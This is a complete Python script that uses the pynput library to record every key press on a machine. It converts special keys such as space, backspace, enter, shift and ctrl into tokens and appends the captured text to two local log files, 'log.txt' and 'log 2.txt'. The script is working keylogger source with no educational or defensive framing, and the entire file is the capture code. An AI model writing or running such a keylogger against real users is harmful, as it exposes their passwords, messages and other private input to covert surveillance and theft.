from pynput.keyboard import Listener

#this with keyword function will automatically close the opened file once we are done with it

def write_to_file(key):
    key_data = str(key)
    key_data = key_data.replace("'","")

    if key_data == 'Key.space':
        key_data = ' '
    if key_data == 'Key.backspace':
        key_data = ' *BACKSPACE* '
    if key_data == 'Key.enter':
        key_data = '\n'
    if key_data == 'Key.cmd':
        key_data = ' *CMD BUTTON* '
    if key_data == 'Key.shift':
        key_data = ' *SHIFT* '
    if key_data == 'Key.ctrl_l':
        key_data = ' *CTRL-l* '
    if key_data == 'Key.ctrl_r':
        key_data = ' *CTRL-r* '
    with open("log.txt",'a') as file:
        file.write(key_data)


    if key_data == ' *BACKSPACE* ':
        key_data = '\b '
    if key_data == ' *CMD BUTTON* ':
        key_data = ''
    if key_data == ' *SHIFT* ':
        key_data = ''
    if key_data == ' *CTRL-l* ':
        key_data = ''
    if key_data == ' *CTRL-r* ':
        key_data = ''
    with open("log 2.txt",'a') as file:
        file.write(key_data)


with Listener(on_press=write_to_file) as L:
    L.join()